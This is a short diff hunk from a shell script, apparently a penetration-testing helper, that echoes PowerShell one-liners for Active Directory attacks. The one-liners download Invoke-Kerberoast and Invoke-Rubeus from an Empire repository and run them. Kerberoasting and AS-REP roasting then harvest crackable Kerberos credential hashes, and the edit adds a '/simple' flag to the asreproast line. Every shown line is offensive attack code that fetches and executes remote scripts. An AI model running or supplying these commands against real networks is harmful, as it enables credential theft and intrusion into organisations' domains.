@@ -1877,7 +1877,7 @@ echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Kerberoast.ps1);Invoke-
 echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1);Invoke-Rubeus -Command "\"kerberoast /nowrap /simple"\""
 echo -e ""
 echo -e "${IBLUE}AS-REP Roastable users${RESTORE}"
-echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1);Invoke-Rubeus -Command "\"asreproast /nowrap"\""
+echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Rubeus.ps1);Invoke-Rubeus -Command "\"asreproast /nowrap /simple"\""
 echo -e ""
 echo -e ""
 
